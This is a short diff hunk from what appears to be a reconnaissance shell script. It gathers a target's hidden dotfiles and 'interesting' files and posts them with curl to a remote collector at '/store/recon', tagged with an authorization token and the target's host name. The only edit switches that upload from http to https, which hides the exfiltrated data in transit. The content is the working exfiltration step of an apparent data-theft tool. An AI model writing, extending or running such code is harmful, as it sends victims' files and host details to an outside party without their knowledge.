@@ -81,7 +81,7 @@ add "HIDDEN/DOTFILES (~)" "dotfiles:$DOTS
 interesting:$INTERESTING"
 
 # ── POST ─────────────────────────────────────────────────
-printf "$OUT" | curl -s -X POST "http://$H:$P/store/recon" \
+printf "$OUT" | curl -s -X POST "https://$H:$P/store/recon" \
      -H "Authorization: $AU" \
      -H "Content-Type: text/plain" \
      -H "X-Target: $TH" \
